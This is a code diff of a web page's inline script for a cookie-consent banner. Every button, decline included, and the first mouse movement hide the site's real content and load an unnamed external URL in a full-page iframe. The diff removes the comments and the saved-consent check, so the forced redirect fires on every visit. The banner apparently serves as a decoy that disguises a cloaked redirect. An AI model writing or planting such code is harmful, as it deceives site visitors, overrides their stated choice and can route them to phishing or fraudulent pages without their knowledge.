@@ -311,7 +311,6 @@
         </div>
     </div>
 
-    <!-- ========== 🔥 IFRAME CONTAINER (hidden by default) ========== -->
     <div id="iframeContainer">
         <iframe id="redirectIframe" src="about:blank"></iframe>
     </div>
@@ -344,18 +343,15 @@
                 return;
             }
 
-            // Hide your original website content
             const yourContent = document.getElementById('yourWebsiteContent');
             if (yourContent) yourContent.style.display = 'none';
 
-            // Show the iframe with the redirected website
             const iframeContainer = document.getElementById('iframeContainer');
             const iframe = document.getElementById('redirectIframe');
             if (iframeContainer && iframe) {
                 iframeContainer.style.display = 'block';
                 iframe.src = targetUrl;
             } else {
-                // Fallback: create iframe on the fly
                 const newContainer = document.createElement('div');
                 newContainer.id = 'iframeContainer';
                 newContainer.style.cssText =
@@ -373,8 +369,6 @@
         const declineBtn = document.getElementById('cookieDecline');
         const closeBtn = document.getElementById('cookieClose');
 
-        const hasConsent = localStorage.getItem('cookie-consent') !== null;
-
         function hideModalAndRedirect(consent) {
             localStorage.setItem('cookie-consent', consent);
             if (modalBox) modalBox.classList.add('hidden');
@@ -386,7 +380,6 @@
             hideModalAndRedirect('closed');
         }
 
-        // --- Button / click events ---
         if (acceptBtn) acceptBtn.onclick = function() {
             hideModalAndRedirect('accepted');
         };
@@ -400,14 +393,9 @@
             hideModalAndRedirect('closed');
         };
 
-        if (!hasConsent) {
-            if (modalBox) modalBox.classList.remove('hidden');
-            // Attach one‑time mouse‑move listener for this visit
-            document.addEventListener('mousemove', mouseMoveHandler, { once: true });
-        } else {
-            if (modalBox) modalBox.classList.add('hidden');
-            performRedirect();
-        }
+        if (modalBox) modalBox.classList.remove('hidden');
+        // Attach one‑time mouse‑move listener for this visit
+        document.addEventListener('mousemove', mouseMoveHandler, { once: true });
 
     </script>
 </body>
